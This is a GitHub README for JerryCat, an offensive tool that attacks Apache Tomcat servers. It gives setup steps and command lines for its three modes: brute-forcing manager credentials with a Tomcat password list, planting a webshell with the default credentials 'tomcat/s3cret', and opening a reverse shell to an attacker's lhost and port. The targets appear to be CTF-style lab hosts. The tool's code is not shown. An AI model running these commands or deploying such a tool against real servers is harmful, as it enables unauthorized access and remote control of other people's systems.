<h1 align="center">JerryCat 🐭<h1>
<p align="center">
  <img alt="Version" src="https://img.shields.io/badge/version-1.0-orange.svg?cacheSeconds=2592000" />
  <a href="https://github.com/Ruulian/wconsole_extractor/blob/main/LICENSE" target="_blank">
    <img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-yellow.svg" />
  </a>
  </br>
  <a href="https://twitter.com/Talace_" target="_blank">
    <img alt="Twitter: Talace_" src="https://img.shields.io/twitter/follow/Talace_.svg?style=social" />
  </a>
  <a href="https://twitter.com/LeandreOnizuka" target="_blank">
    <img alt="Twitter: LeandreOnizuka" src="https://img.shields.io/twitter/follow/LeandreOnizuka.svg?style=social" />
  </a>
</p>

## Features/Mode ⚒️

 - [x] Brute Force (brute)
 - [x] Webshell (exec)
 - [x] Reverse shell (reverse)

## Setup ✨

Clone & install dependencies
```sh
git clone https://github.com/TheF0rceAwak5ns/JerryCat.git && cd JerryCat && pip install -r requirements.txt
```

## Usage - Unauthenticated attack 

### Brute Force
**without** a user list
```sh
python3 jerrycat.py brute http://10.10.10.95:8080/ -P wordlists/password-list-common-tomcat.txt
```
**with** a user list
```sh
python3 jerrycat.py brute http://10.10.10.95:8080/ -U /path/to/user/list -P wordlists/password-list-common-tomcat.txt
```
![brute_1](https://github.com/TheF0rceAwak5ns/JerryCat/assets/117742366/57a83800-6b2a-4d16-96ea-8b3ff469fffd)


## Usage - Authenticated attack

### Webshell
```sh
python3 jerrycat.py exec http://10.10.10.95:8080/ -u tomcat -p s3cret
```
![webshell](https://github.com/TheF0rceAwak5ns/JerryCat/assets/117742366/4588a9bb-f2ca-4a45-ac26-75cd1ee956d0)

### Reverse shell
```sh
python3 jerrycat.py reverse http://10.10.10.95:8080/ -u tomcat -p s3cret --lhost 10.10.14.9 --lport 4444
```
![reverse_1](https://github.com/TheF0rceAwak5ns/JerryCat/assets/117742366/5436ff31-6996-4a43-a055-00fce23bac64)




